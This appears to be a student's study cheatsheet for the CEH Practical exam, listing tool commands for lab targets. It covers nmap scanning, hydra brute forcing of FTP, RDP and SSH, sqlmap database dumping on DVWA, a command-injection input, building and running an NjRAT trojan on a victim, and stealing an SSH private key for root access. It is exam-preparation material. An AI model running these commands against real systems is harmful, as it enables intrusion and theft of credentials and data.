# CEH_PRACTICAL
This my cheatsheet that i used to study for CEH_PRACTICAL
Tools
1.	Nmap/Zenmap
2.	Wireshark
3.	Metasploit
4.	Hydra
5.	Cryptool / BCTextEncoder
6.	Veracrypt
7.	Burp suite
8.	Hydra
9.	Hashes.com/HashMyfiles/HashCalc
10.	Snow steganography/OpenStego/Covert TCP
11.	SQL Injection / nslookup/sqlmap/nikto
12.	Android Debugging Bridge (adb)
# PRACTICAL TIME
1.	**Network Scanning & Vulnerability Assessment**
•	Find Live hosts (nmap /netdiscover)
	Sudo nmap [IP address] – for exam (CEH Practical)
o	Sudo nmap –sC –sV –v –A –p– –O –T4 [IP Address range] – more aggressive deep scanning
o	Sudo nmap –sV –script vuln [IP Address] – finding vulnerabilities in a host (-oX save file)
o	Sudo nmap –sP 192.168.1.*:- when scanning a large network

•	Find open ports & services running on those ports (nmap)
	Sudo nmap –sC –sV –v –p– –T4 [IP Address range]
2.	**Enumeration**
•	ftp port 21 – used to transfer files between computers (file sharing)
o	check IP to see which is running ftp
	nmap –sC –p 21 [IP address]
o	ftp [IP] :- you need to bruteforce the password login credentials using hydra tool
	hydra –L username.txt –P password.txt [IP address] ftp (  the lists of password & usernames are given in the exam)
	login ftp [IP address]
o	enter password and username from the one that you brute forced
o	ftp>ls
o	ftp> get secret.txt (used to download the file into your local machine)
o	root@attacker:~#ls
o	root@attacker:~#cat secret.txt (to view the file contents)

•	SNMP port 161– used to monitor and manage network devices e.g. routers, switches, servers etc.
o	Nmap –sP [IP /24]
o	Nmap –sU [IP Address] (scan for UDP ports on the target machine) 
o	snmp-check [ip address] NB take note of the UDP port to listen to)
o	check NSE scripts online on nmap.org
o	nmap –sU –p 161(UDP port) –script=snmp-processes [IP Address] ( finding running process using nmap
o	msfconsole (start Metasploit to find valid strings)
o	msf5>search snmp
o	msf5>use auxiliary/scanner/snmp/snmp_login
o	msf5 auxiliary(scanner/snmp/snmp_login)> show options
o	msf5 auxiliary(scanner/snmp/snmp_login)>set RHOSTS [IP Address]
o	msf5 auxiliary(scanner/snmp/snmp_login)>exploit
•	SNMP check interfaces
o	nmap –sU –p 161(UDP port) –script=snmp-interfaces [IP Address] ( finding running process using nmap
o	snmp-check [IP address]
•	SMB Enumeration (SMB request services from server programs, it’s a protocol that allows apps on a computer read/write files)
o	Nmap [target IP] (smb running on port 445)
o	Nmap –p 445 --script smb-enum-shares [IP address] (enumerating files) shares files with details permissions
o	Connecting GUI method (smb://[IP] on web)
o	Nmap –p 445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 [IP address] (enumerating users)
o	Nmap –p 445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 [IP address] (enumerating groups)
o	Nmap –sC –sV –A –T4 –p445 [IP Address] (enumerating security levels)
o	Nmap –p 445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 [IP address] (enumerating services)
o	
•	Making an RDP session and Enumerate RDP service
o	Nmap [Ip address] port 3333 or 3389 is for RDP
o	Msfconsole
o	msf5> search rdp
o	msf5>use auxiliary/scanner/rdp/rdp_scanner
o	msf5 auxiliary(scanner/rdp/rdp_scanner)> set RHOSTS [target IP]
o	msf5 auxiliary(scanner/rdp/rdp_scanner)>set RPORT 3333
o	msf5 auxiliary(scanner/rdp/rdp_scanner)>exploit (detected rdp on ….. confirmed rdp is running)
o	hydra –L {path} –P{path} rdp://[IP address] –s 3333 (brute force passwords & save them)
o	root@attacker:~# xfreerdp /u:administrator /p:etcect /v:[ip]:3333(create an rdp session) 
•	Enumerate NetBIOS port 137(UDP: TCP)/138(UDP)/139(TCP) facilitates and allows computer to connect over the local network, access files & resources such as printers & files
o	Check ip first by ip a
o	Nmap –sP [IP address]
o	Nmap –sV --script nbstat.nse [IP address]

3.	**Hacking Web Application & Android** 
•	Wpscan
o	Wpscan in Kali Linux Wpscan –h will show you all the commands you can use
o	Wpscan –url [copy url http://192.168.0.1] --enumerate u  (u for users) 
o	Wpscan –url (or just –u for url) [copy url http://192.168.0.1] --enumerate u vp (vp for vulnerable plugins & u for users) 
o	Sudo Wpscan --password-attack xmlrpc –t 20 –U (usernames) –P (password list)  --url http://[IP] --random-user-agent (if necessary)- bruteforce for passwords
•	Sqlmap for sql injections–Using DVWA website
o	Go to command execution
o	Enter an IP address and submit :- [IP] | pwd to see the directory that I am
o	UserID enter 1
o	Open burp Suite
o	Go to terminal in parrot : sqlmap –r req.txt –dbs the file is in desktop
o	Sqlmap –r req.txt –D dvwa ( name of the data base )
o	Sqlmap –r req.txt –D dvwa --tables --columns   ( Details )
o	Sqlmap –r req.txt –D dvwa --dump (contents of the tables)
•	Burp Suite
o	Check on http requests and proxy (use this to save  cookies as req.txt)
•	Android Pentest (ADB) – a tool that bridge the communication between your device and computer ( use windows)
o	‘adb devices’ command will show you all the devices connected
o	adb connect [IP address]:5555 ( just give any port) 
o	adb shell ( you are in the device )
o	hit ls to see where you are in the device
o	cd sdcard/
o	cat secrete.txt
4.	**Traffic Sniffing**
•	Wireshark
Pcap analysis – Filtering packets
o	tcp.flags.syn
o	Follow streams red part is our request and the blue part is the server response
o	To see if there is a txt file – export object got to file, export object of http and save it 
(DOS, DDOS)
5.**	Steganography**
•	SNOW – for hiding and extracting hidden data from a text file
o	Open SNOW.EXE (NB. you have to write in uppercase)–C (compile) –m “this is the secret message” –p ‘’give the password any’’ Secret.txt (this is the secrete file) Hiddensecret.txt (is the file you want to be the output)
o	To extract the hidden file-: SNOW.EXE –C -p “given password any” Hiddensecret.txt and then hit enter.
•	OpenStego – for hiding and extracting hidden data from an image file
o	Open the OpenStego tool
o	There 2 options, Hiding data and extracting the secret
o	Follow options-: they are self-explanatory
o	When extracting data the same. In an exam you can be told to extract a file and you will find a key. Open hashes.com on browser and then retrieve the key
•	Covert – for hiding data in TCP/IP packet headers
o	Download covert_tcp file in parrot
o	Cd Downloads
o	Then ~/Downloads/Covert_tcp $ ls there will be 3 files covert_tcp, covert_tcp.c & secret.txt and then-: rm covert_tcp to remove it in parrot
o	Enter a command: cc –a covert_tcp covert_tcp.c 
o	  ./covert_tcp  –source [IP Addrr e.g. 192.168.1.1] ( source Ip)  –dest [IP Addrr] (destination IP) –source_port 9999 ( set any port) –dest_port 8888 –file secret.txt  -: this is done from source computer
o	./covert_tcp  –source [IP Addrr: 192.168.1.1] ( source Ip)  -source_port 8888 –server –file receive.txt (received file as)
**6.	Cryptography – practice of securing information so that it’s only accessible to authorised users only. The goal is to protect sensitive information**
•	HashMyfiles - calculating and comparing hashes of files
o	Open the tool 
o	Drag and drop the files to the HashMyfiles application
o	The change in the background colour may mean that the data has been tempered with or the data in the files is the same
•	Cryptool – encrypting and decrypting of hex data – by manipulating key length
o	Open the app and open file
o	Go to analysis and then symmetric – RC4, a window pops up change the key length maybe to 16bit depends with the qns
•	BCTextEncoder -  encoding and decoding text in file .hex 
o	Open the app
o	Enter passwords to encode the text to hex format
o	To decrypt the hash go to hashes.com online and paste the hash key
•	Crypto Forge – encrypting and decrypting the files
o	Select file & right click
o	Select encrypt. To decrypt the hash go to hashes.com online and paste the hash key
•	Veracrypt – hiding and encrypting the disk partitions
o	Open app and hit create volume option
o	Create an encrypted file container
o	Hidden volume then normal mode then next & select folder then C:\ then file name NB mouse hover hover
o	Go to  App, select mount to retrieve information of the hidden partition, this is do  
7.	**RAT – Remote Access Trojans (ProRat & NjRAT) **
o	If you try and you are getting a response “no connection” it means maybe you have chosen the wrong machine to target or he port you have selected is the wrong one. Or the server is of different tool and you are using a different tool.
o	Using ProRat you open it using attacker machine using the IP address of the victim machine use the default port
o	Click connect and insert password. The password is provided if ProRat is used but if there is no password it means you use either HTTP RAT or NjRAT and you brute force.
o	Click on search files, copy the location and download the file.
o	You can make use of the File Manager option that is GUI
USING NjRAT
o	Using windows 11 as attacker and windows server as victim
o	Use the same default port and click start
o	Click on builder and provide the IP of the attacker machine on the host 
o	Click build and it will create server.exe file and save it e.g. on desktop
o	Share the file on the share folder (Desktop)then go to the server victim machine
o	Run the .EXE file 
o	Switch back to attacker ,machine and you can see the session has been opened 
o	You can right click on the session and use even RDP 
8.	**Privilege escalation**
o	ssh user1@[IP Addrr] –p(port) hit Y to agree and then enter the password you are provided or use hydra to brute force the password
o	If you hit the command whoami it shows you the user
o	 Sudo –L it shows you which users are there 
o	Go to the desired directory and do ls then it shows you the file, if you hit cat flag.txt you want to retrieve info in the file
o	Sudo –u user2 /bin/bash now you are logged in as user2 then go to the desired directory
o	This is horizontal privilege escalation
Escalate to root user
o	ls la shows all users
o	cd /root (access denied)
o	cd .ssh
o	ls
o	cat id_rsa you get ssh private key an copy 
o	nano id_rsa and then paste the key (in our local machine)
o	chmod 600 id_rsa (give permission to this file)
o	ssh root@[target IP] –p (port) –i  id_rsa
o	ls 
o	cat flag.txt
Nikto- nikto –h http://[IP Address]:80 (you can run on port 80)
